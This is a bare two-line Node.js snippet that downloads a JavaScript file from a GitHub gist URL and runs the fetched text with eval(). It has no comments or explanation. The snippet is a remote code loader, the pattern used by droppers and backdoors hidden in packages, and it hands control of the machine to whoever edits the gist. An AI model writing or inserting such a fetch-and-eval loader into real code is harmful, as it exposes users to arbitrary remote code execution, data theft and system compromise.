const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/568e7a39dfef069f389ac5190bf01a468316f29f/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
